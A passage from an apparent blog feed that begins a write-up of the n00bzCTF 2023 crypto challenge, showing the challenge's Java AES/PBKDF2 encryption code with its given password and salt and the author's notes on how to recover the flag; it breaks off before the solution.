&lt;li&gt;Flask tutorial by &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=Z1RJmh_OqeA&quot;&gt;freecodecamp&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;additional-links&quot;&gt;Additional Links&lt;&#x2F;h3&gt;
&lt;p&gt;Source code : &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;novel-cryptography-project&quot;&gt;Github&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Please let me know there was any bug&#x2F;flaw in the implementation..&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Thank you!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>n00b CTF 2023</title>
        <published>2023-06-10T00:00:00+00:00</published>
        <updated>2023-06-10T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/n00bzctf23/"/>
        <id>https://themj0ln1r.github.io/writeups/n00bzctf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/n00bzctf23/">&lt;p&gt;Hello all!
I played &lt;a href= &quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1895&quot; target=_blank&gt;n00bzCTF 2023&lt;&#x2F;a&gt; which was happened from  09 June to 11 June. I played it with my team &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;217079&quot;&gt;Invaders0x1&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Lets see the solutions to the challenges I solved.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto&quot; aria-label=&quot;Anchor link for: crypto&quot;&gt;Crypto&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;My cousin-sister messaged me on Instagram that she has got some text FOqxc90aMQZydCQb2MUm5tj4kRIxxVeCDWzAANfOrr8JItHYneUHhSV0awvQIo&#x2F;8E1LtfYm&#x2F;+VVWz0PDK6MXp38BWHoFDorhdS44DzYj9CQ= and a text file in which something like String password: aesiseasy and Salt: saltval was writt,en can you help her to decode the weird text?
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached Files : [enc.java]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;enc.java&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;java&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;javax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Cipher&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;javax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKey&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;javax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKeyFactory&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;javax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;spec&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;PBEKeySpec&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;javax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;spec&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKeySpec&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;nio&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;charset&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;StandardCharsets&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;security&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;spec&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;KeySpec&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;public class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;AESChallenge &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;private static final &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;AES_ALGORITHM &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;AES&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;private static final &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;PBKDF2_ALGORITHM &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PBKDF2WithHmacSHA256&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;private static final int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;ITERATIONS &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;private static final int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;KEY_SIZE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;256&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;private static &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;generateKey&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;byte[] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;salt&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;throws &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Exception &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;KeySpec&lt;&#x2F;span&gt;&lt;span&gt; spec &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;PBEKeySpec&lt;&#x2F;span&gt;&lt;span&gt;(password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;toCharArray&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; salt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;ITERATIONS&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;KEY_SIZE&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKeyFactory&lt;&#x2F;span&gt;&lt;span&gt; factory &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKeyFactory&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getInstance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;PBKDF2_ALGORITHM&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKey&lt;&#x2F;span&gt;&lt;span&gt; tmp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; factory&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;generateSecret&lt;&#x2F;span&gt;&lt;span&gt;(spec)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return new &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKeySpec&lt;&#x2F;span&gt;&lt;span&gt;(tmp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getEncoded&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;AES_ALGORITHM&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;private static &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encrypt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;plainText&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;key&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;throws &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Exception &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Cipher&lt;&#x2F;span&gt;&lt;span&gt; cipher &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Cipher&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getInstance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;AES_ALGORITHM&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        cipher&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;init&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Cipher&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;ENCRYPT_MODE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; key)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;byte[]&lt;&#x2F;span&gt;&lt;span&gt; encryptedBytes &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; cipher&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;doFinal&lt;&#x2F;span&gt;&lt;span&gt;(plainText&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getBytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;StandardCharsets&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;UTF_8&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getEncoder&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeToString&lt;&#x2F;span&gt;&lt;span&gt;(encryptedBytes)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;public static void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;args&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt; flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;REDACTED&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt; password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;aesiseasy&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;byte[]&lt;&#x2F;span&gt;&lt;span&gt; salt &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;saltval&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getBytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;StandardCharsets&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;UTF_8&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKey&lt;&#x2F;span&gt;&lt;span&gt; key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;generateKey&lt;&#x2F;span&gt;&lt;span&gt;(password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; salt)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(key)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt; encryptedFlag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encrypt&lt;&#x2F;span&gt;&lt;span&gt;(flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; key)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Encrypted Flag: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt; encryptedFlag)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;catch &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Exception &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;e&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printStackTrace&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Changed the file to &lt;code&gt;AESChallenge.java&lt;&#x2F;code&gt; to match with the class name.&lt;&#x2F;p&gt;
&lt;p&gt;Observations :&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;1. The main method has the variables password, salt. 
&lt;&#x2F;span&gt;&lt;span&gt;2. The encrypt function requires two arguements (flag,key)
&lt;&#x2F;span&gt;&lt;span&gt;3. Key is generated by generatekey method which takes two arguments (password,salt)
&lt;&#x2F;span&gt;&lt;span&gt;4. The encrypted flag with the key from generatekey method is converted to base64
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;So, we have to decrypt the AES generated ciphertext with the key, generated by generatekey method.&lt;&#x2F;p&gt;
&lt;p&gt;We have salt and password to generate the key using generatekey method.&lt;&#x2F;p&gt;
